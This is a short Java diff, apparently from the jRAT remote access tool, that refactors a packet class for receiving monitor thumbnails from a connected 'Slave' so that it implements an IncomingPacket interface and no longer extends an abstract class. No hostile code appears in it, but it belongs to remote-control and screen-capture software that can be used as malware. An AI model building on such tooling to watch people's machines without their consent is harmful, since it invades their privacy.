@@ -3,7 +3,7 @@ package jrat.module.screen.packets;
 import graphslib.monitors.PanelMonitors.PanelMonitor;
 import jrat.common.utils.ImageUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlMonitors;
 import jrat.module.screen.ui.DialogPickMonitor;
@@ -14,7 +14,7 @@ import java.util.List;
 /**
  * Packet contains a thumbnail for each available monitor
  */
-public class PacketReceiveAllThumbnails extends AbstractIncomingPacket {
+public class PacketReceiveAllThumbnails implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
